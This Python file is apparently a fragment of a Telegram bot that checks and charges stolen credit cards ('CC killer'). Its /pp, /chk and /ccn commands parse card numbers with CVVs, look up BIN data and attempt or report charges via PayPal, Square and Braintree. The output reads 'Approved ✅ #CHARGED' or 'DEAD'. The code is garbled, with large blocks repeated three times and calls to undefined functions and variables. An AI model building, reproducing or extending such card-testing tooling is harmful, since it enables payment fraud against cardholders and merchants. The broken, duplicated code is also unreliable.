- 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: {result['error']}\n
- 𝗜𝗻𝗳𝗼: {bin_info.get("scheme", "UNKNOWN")} - {bin_info.get("type", "UNKNOWN")} - {bin_info.get("brand", "UNKNOWN")}
- 𝐈𝐬𝐬𝐮𝐞𝐫: {bin_info.get("bank", {}).get("name", "Not available")}
- 𝐂𝐨𝐮𝐧𝐭𝐫𝐲: {bin_info.get("country", {}).get("name", "Not available")} {bin_info.get("country", {}).get("emoji", "🌍")}
- 𝗧𝗶𝗺𝗲: {toc - tic:0.2f} 𝐬𝐞𝐜𝐨𝐧𝐝𝐬
- 𝐁𝐨𝐭: @{BOT_USERNAME}
            ''')

    toc = time.perf_counter()  # Define toc here as well
    await message.reply(f'''
        𝗗𝗲𝗰𝗹𝗶𝗻𝗲𝗱 ❌\n\n
- 𝗖𝗮𝗿𝗱: {ccn}|{mm}|{yy}|{cvv}
- 𝐒𝐭𝐚𝐭𝐮𝐬: DEAD
- 𝐆𝐚𝐭𝐞𝐰𝐚𝐲: Braintree
- 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: Unknown error occurred\n
- 𝗜𝗻𝗳𝗼: {bin_info.get("scheme", "UNKNOWN")} - {bin_info.get("type", "UNKNOWN")} - {bin_info.get("brand", "UNKNOWN")}
- 𝐈𝐬𝐬𝐮𝐞𝐫: {bin_info.get("bank", {}).get("name", "Not available")}
- 𝐂𝐨𝐮𝐧𝐭𝐫𝐲: {bin_info.get("country", {}).get("name", "Not available")} {bin_info.get("country", {}).get("emoji", "🌍")}
- 𝗧𝗶𝗺𝗲: {toc - tic:0.2f} 𝐬𝐞𝐜𝐨𝐧𝐝𝐬
- 𝐁𝐨𝐭: @{BOT_USERNAME}
    ''')

    return await message.reply(status_message)

async def authenticate_cc_killer(ccn, mm, yy, cvv, user_id, user_first_name):
    # Your authentication logic for the second CC killer function goes here
    # You can use the same or a different authentication method as needed
    # Return the authentication result, e.g., "Authenticated" or "Authentication Failed"

    # Example authentication logic:
    if user_id == 6442310977:
        return "Authenticated"
    else:
        return "Authentication Failed"

async def get_credit_card_info(ccn):
    # Use lookup.binlist.net to get details about the credit card
    binlist_url = f'https://lookup.binlist.net/{ccn}'

    try:
        response = requests.get(binlist_url)
        data = response.json()

        return data
    except Exception as e:
        print(f"Error fetching BIN information: {e}")
        return {}

# Your existing message handler for processing credit card numbers
@dp.message_handler(commands=['pp'], commands_prefix=PREFIX)
async def ch(message: types.Message):
    await message.answer_chat_action('typing')
    tic = time.perf_counter()
    ID = message.from_user.id
    FIRST = message.from_user.first_name
    try:
        await dp.throttle('pp', rate=ANTISPAM)
    except Throttled:
        await message.reply('<b>Too many requests!</b>\n'
                            f'Blocked For {ANTISPAM} seconds')
    else:
        if message.reply_to_message:
            cc = message.reply_to_message.text
        else:
            cc = message.text[len('/pp '):]

        if len(cc) == 0:
            return await message.reply("<b>No Card to chk</b>")

        x = re.findall(r'\d+', cc)
        ccn = x[0]
        mm = x[1]
        yy = x[2]
        cvv = x[3]
        if mm.startswith('2'):
            mm, yy = yy, mm
        if len(mm) >= 3:
            mm, yy, cvv = yy, cvv, mm
        if len(ccn) < 15 or len(ccn) > 16:
            return await message.reply('<b>Failed to parse Card</b>\n'
                                       '<b>Reason: Invalid Format!</b>')   
                                       
        # Get bin information
        BIN = ccn[:6]
        if BIN in BLACKLISTED:
            return await message.reply('<b>BLACKLISTED BIN</b>')
        
        # Function to get BIN information
        bin_info = await get_credit_card_info(BIN)

        # Use the provided PayPal simulation function
        result = simulate_paypal_donation(ccn, mm, yy, cvv)

        if 'success' in result:
            toc = time.perf_counter()
            return await message.reply(f'''
                𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 ✅\n\n
- 𝗖𝗮𝗿𝗱: {ccn}|{mm}|{yy}|{cvv}
- 𝐒𝐭𝐚𝐭𝐮𝐬: #CHARGED $25
- 𝐆𝐚𝐭𝐞𝐰𝐚𝐲: Shopify + Stripe
- 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: Thanks for donation\n\n
- 𝗜𝗻𝗳𝗼: {bin_info.get("scheme", "UNKNOWN")} - {bin_info.get("type", "UNKNOWN")} - {bin_info.get("brand", "UNKNOWN")}
- 𝐈𝐬𝐬𝐮𝐞𝐫: {bin_info.get("bank", {}).get("name", "Not available")}\n
- 𝐂𝐨𝐮𝐧𝐭𝐫𝐲: {bin_info.get("country", {}).get("name", "Not available")} {bin_info.get("country", {}).get("emoji", "🌍")}
- 𝗧𝗶𝗺𝗲: {toc - tic:0.2f} 𝐬𝐞𝐜𝐨𝐧𝐝𝐬
- 𝐁𝐨𝐭: @{BOT_USERNAME}
            ''')

        elif 'error' in result:
            toc = time.perf_counter()
            return await message.reply(f'''
                𝗗𝗲𝗰𝗹𝗶𝗻𝗲𝗱 ❌\n\n
- 𝗖𝗮𝗿𝗱: {ccn}|{mm}|{yy}|{cvv}
- 𝐒𝐭𝐚𝐭𝐮𝐬: #Declined
- 𝐆𝐚𝐭𝐞𝐰𝐚𝐲: Braintree
- 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: {result['error']}\n
- 𝗜𝗻𝗳𝗼: {bin_info.get("scheme", "UNKNOWN")} - {bin_info.get("type", "UNKNOWN")} - {bin_info.get("brand", "UNKNOWN")}
- 𝐈𝐬𝐬𝐮𝐞𝐫: {bin_info.get("bank", {}).get("name", "Not available")}
- 𝐂𝐨𝐮𝐧𝐭𝐫𝐲: {bin_info.get("country", {}).get("name", "Not available")} {bin_info.get("country", {}).get("emoji", "🌍")}
- 𝗧𝗶𝗺𝗲: {toc - tic:0.2f} 𝐬𝐞𝐜𝐨𝐧𝐝𝐬
- 𝐁𝐨𝐭: @{BOT_USERNAME}
            ''')

    toc = time.perf_counter()  # Define toc here as well
    await message.reply(f'''
        𝗗𝗲𝗰𝗹𝗶𝗻𝗲𝗱 ❌\n\n
- 𝗖𝗮𝗿𝗱: {ccn}|{mm}|{yy}|{cvv}
- 𝐒𝐭𝐚𝐭𝐮𝐬: DEAD
- 𝐆𝐚𝐭𝐞𝐰𝐚𝐲: Braintree
- 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: Unknown error occurred\n
- 𝗜𝗻𝗳𝗼: {bin_info.get("scheme", "UNKNOWN")} - {bin_info.get("type", "UNKNOWN")} - {bin_info.get("brand", "UNKNOWN")}
- 𝐈𝐬𝐬𝐮𝐞𝐫: {bin_info.get("bank", {}).get("name", "Not available")}
- 𝐂𝐨𝐮𝐧𝐭𝐫𝐲: {bin_info.get("country", {}).get("name", "Not available")} {bin_info.get("country", {}).get("emoji", "🌍")}
- 𝗧𝗶𝗺𝗲: {toc - tic:0.2f} 𝐬𝐞𝐜𝐨𝐧𝐝𝐬
- 𝐁𝐨𝐭: @{BOT_USERNAME}
    ''')

    return await message.reply(status_message)

async def authenticate_cc_killer(ccn, mm, yy, cvv, user_id, user_first_name):
    # Your authentication logic for the second CC killer function goes here
    # You can use the same or a different authentication method as needed
    # Return the authentication result, e.g., "Authenticated" or "Authentication Failed"

    # Example authentication logic:
    if user_id == 6442310977:
        return "Authenticated"
    else:
        return "Authentication Failed"

async def get_credit_card_info(ccn):
    # Use lookup.binlist.net to get details about the credit card
    binlist_url = f'https://lookup.binlist.net/{ccn}'

    try:
        response = requests.get(binlist_url)
        data = response.json()

        return data
    except Exception as e:
        print(f"Error fetching BIN information: {e}")
        return {}


@dp.message_handler(commands=['chk'], commands_prefix=PREFIX)
async def square_auth(message: types.Message):
    await message.answer_chat_action('typing')
    tic = time.perf_counter()
    ID = message.from_user.id
    FIRST = message.from_user.first_name
    access_token = None
    try:
        await dp.throttle('chk', rate=ANTISPAM)
    except Throttled:
        await message.reply('<b>Too many requests!</b>\n'
                            f'Blocked For {ANTISPAM} seconds')
    else:
        if message.reply_to_message:
            cc = message.reply_to_message.text
        else:
            cc = message.text[len('/chk '):]

        if len(cc) == 0:
            return await message.reply("<b>No Card to check</b>")

        x = re.findall(r'\d+', cc)
        ccn = x[0]
        mm = x[1]
        yy = x[2]
        cvv = x[3]
        if mm.startswith('2'):
            mm, yy = yy, mm
        if len(mm) >= 3:
            mm, yy, cvv = yy, cvv, mm
        if len(ccn) < 15 or len(ccn) > 16:
            return await message.reply('<b>Failed to parse Card</b>\n'
                                       '<b>Reason: Invalid Format!</b>')   

        access_token = generate_square_access_token()

        if access_token:
            result = simulate_square_auth(ccn, mm, yy, cvv, access_token)

        # Get bin information
        BIN = ccn[:6]
        if BIN in BLACKLISTED:
            return await message.reply('<b>BLACKLISTED BIN</b>')
        
        # Function to get BIN information
        bin_info = await get_credit_card_info(BIN)

        # Use the provided PayPal simulation function
        result = simulate_paypal_donation(ccn, mm, yy, cvv)

        if 'success' in result:
            toc = time.perf_counter()
            return await message.reply(f'''
                𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 ✅\n\n
- 𝗖𝗮𝗿𝗱: {ccn}|{mm}|{yy}|{cvv}
- 𝐒𝐭𝐚𝐭𝐮𝐬: #CHARGED $25
- 𝐆𝐚𝐭𝐞𝐰𝐚𝐲: Shopify + Stripe
- 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: Thanks for donation\n\n
- 𝗜𝗻𝗳𝗼: {bin_info.get("scheme", "UNKNOWN")} - {bin_info.get("type", "UNKNOWN")} - {bin_info.get("brand", "UNKNOWN")}
- 𝐈𝐬𝐬𝐮𝐞𝐫: {bin_info.get("bank", {}).get("name", "Not available")}\n
- 𝐂𝐨𝐮𝐧𝐭𝐫𝐲: {bin_info.get("country", {}).get("name", "Not available")} {bin_info.get("country", {}).get("emoji", "🌍")}
- 𝗧𝗶𝗺𝗲: {toc - tic:0.2f} 𝐬𝐞𝐜𝐨𝐧𝐝𝐬
- 𝐁𝐨𝐭: @{BOT_USERNAME}
            ''')

        elif 'error' in result:
            toc = time.perf_counter()
            return await message.reply(f'''
                𝗗𝗲𝗰𝗹𝗶𝗻𝗲𝗱 ❌\n\n
- 𝗖𝗮𝗿𝗱: {ccn}|{mm}|{yy}|{cvv}
- 𝐒𝐭𝐚𝐭𝐮𝐬: #Declined
- 𝐆𝐚𝐭𝐞𝐰𝐚𝐲: Braintree
- 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: {result['error']}\n
- 𝗜𝗻𝗳𝗼: {bin_info.get("scheme", "UNKNOWN")} - {bin_info.get("type", "UNKNOWN")} - {bin_info.get("brand", "UNKNOWN")}
- 𝐈𝐬𝐬𝐮𝐞𝐫: {bin_info.get("bank", {}).get("name", "Not available")}
- 𝐂𝐨𝐮𝐧𝐭𝐫𝐲: {bin_info.get("country", {}).get("name", "Not available")} {bin_info.get("country", {}).get("emoji", "🌍")}
- 𝗧𝗶𝗺𝗲: {toc - tic:0.2f} 𝐬𝐞𝐜𝐨𝐧𝐝𝐬
- 𝐁𝐨𝐭: @{BOT_USERNAME}
            ''')

    toc = time.perf_counter()  # Define toc here as well
    await message.reply(f'''
        𝗗𝗲𝗰𝗹𝗶𝗻𝗲𝗱 ❌\n\n
- 𝗖𝗮𝗿𝗱: {ccn}|{mm}|{yy}|{cvv}
- 𝐒𝐭𝐚𝐭𝐮𝐬: DEAD
- 𝐆𝐚𝐭𝐞𝐰𝐚𝐲: Braintree
- 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: Unknown error occurred\n
- 𝗜𝗻𝗳𝗼: {bin_info.get("scheme", "UNKNOWN")} - {bin_info.get("type", "UNKNOWN")} - {bin_info.get("brand", "UNKNOWN")}
- 𝐈𝐬𝐬𝐮𝐞𝐫: {bin_info.get("bank", {}).get("name", "Not available")}
- 𝐂𝐨𝐮𝐧𝐭𝐫𝐲: {bin_info.get("country", {}).get("name", "Not available")} {bin_info.get("country", {}).get("emoji", "🌍")}
- 𝗧𝗶𝗺𝗲: {toc - tic:0.2f} 𝐬𝐞𝐜𝐨𝐧𝐝𝐬
- 𝐁𝐨𝐭: @{BOT_USERNAME}
    ''')

    return await message.reply(status_message)

async def authenticate_cc_killer(ccn, mm, yy, cvv, user_id, user_first_name):
    # Your authentication logic for the second CC killer function goes here
    # You can use the same or a different authentication method as needed
    # Return the authentication result, e.g., "Authenticated" or "Authentication Failed"

    # Example authentication logic:
    if user_id == 6442310977:
        return "Authenticated"
    else:
        return "Authentication Failed"

async def get_credit_card_info(ccn):
    # Use lookup.binlist.net to get details about the credit card
    binlist_url = f'https://lookup.binlist.net/{ccn}'

    try:
        response = requests.get(binlist_url)
        data = response.json()

        return data
    except Exception as e:
        print(f"Error fetching BIN information: {e}")
        return {}

@dp.message_handler(commands=['ccn'], commands_prefix=PREFIX)
async def square_charge(message: types.Message):
    await message.answer_chat_action('typing')
    tic = time.perf_counter()
    
    try:
        await dp.throttle('ccn', rate=ANTISPAM)
    except Throttled:
        await message.reply('<b>Too many requests!</b>\n'
                            f'Blocked For {ANTISPAM} seconds')
        return
    
    # Extract the command and arguments from the message text
    command_args = message.get_args()

    # Split the command arguments into parts (ccn, mm, yy, cvv, amount)
    args = command_args.split()

    if len(args) != 2:
        return await message.reply("<b>Invalid command format.</b>\n"
                                   "Please use: /ccn [CARD_NUMBER]|[EXP_DATE]|[CVV] [AMOUNT]")

    card_info, amount = args
    card_parts = card_info.split('|')

    if len(card_parts) != 4:
        return await message.reply('<b>Failed to parse Card</b>\n'
                                   '<b>Reason: Invalid Format!</b>')

    ccn, mm, yy, cvv = card_parts

    if mm.startswith('2'):
        mm, yy = yy, mm
    if len(mm) >= 3:
        mm, yy, cvv = yy, cvv, mm
    if len(ccn) < 15 or len(ccn) > 16:
        return await message.reply('<b>Failed to parse Card</b>\n'
                                   '<b>Reason: Invalid Format!</b>')

    # Generate Square access token
    access_token = generate_square_token()

    if access_token:
        try:
            # Construct the request payload for charging the card
            payload = {
                'source_id': ccn,
                'amount_money': {
                    'amount': int(amount) * 100,  # Convert amount to cents
                    'currency': 'USD'
                }
            }

            # Make a POST request to charge the card using Square API
            headers = {'Authorization': f'Bearer {access_token}', 'Content-Type': 'application/json'}
            response = requests.post(charge_url, json=payload, headers=headers)

            # Check if the request was successful
            if response.status_code == 200:
                return await message.reply(f'''
                    𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 ✅

Card ↯ {ccn}|{mm}|{yy}|{cvv}
Amount ↯ {amount} USD
Status ↯ #AUTHORIZED {amount} USD
Gateway ↯ Square

Response ↯ Payment successful
Time Taken ↯ {time.perf_counter() - tic:0.2f} seconds
Bot ↯ @{BOT_USERNAME}''')
            else:
                return await message.reply(f'''
                    𝗗𝗲𝗰𝗹𝗶𝗻𝗲𝗱 ❌

Card ↯ {ccn}|{mm}|{yy}|{cvv}
Amount ↯ {amount} USD
Status ↯ #Declined
Gateway ↯ Square

Response ↯ {response.text}
Time Taken ↯ {time.perf_counter() - tic:0.2f} seconds
Bot ↯ @{BOT_USERNAME}''')
        except Exception as e:
            return await message.reply(f'''
                𝗗𝗲𝗰𝗹𝗶𝗻𝗲𝗱 ❌

Card ↯ {ccn}|{mm}|{yy}|{cvv}
Amount ↯ {amount} USD
Status ↯ DEAD
Gateway ↯ Square

Response ↯ Error: {str(e)}
Time Taken ↯ {time.perf_counter() - tic:0.2f} seconds
Bot ↯ @{BOT_USERNAME}''')
    else:
        return await message.reply("Gate Under Maintenance ❌")

@dp.message_handler(commands=['sc', 'lbc', 'fedex', 'usps', 'dhl', 'ups'])
async def track_command(message: types.Message):
    try:
        command_args = message.get_args().split()
        if command_args:
            tracking_number = command_args[0]
            carrier = message.text[1:]
            result = await track_shipment(tracking_number, carrier)

            if isinstance(result, types.InlineKeyboardMarkup):
                await message.reply("Choose an option:", reply_markup=result)
            else:
                await message.reply(result)
        else:
            await message.reply("Please provide a tracking number with the command.")
    except Exception as e:
        await message.reply(f"An error occurred: {e}")
if __name__ == '__main__':
    executor.start_polling(dp, skip_updates=True)
   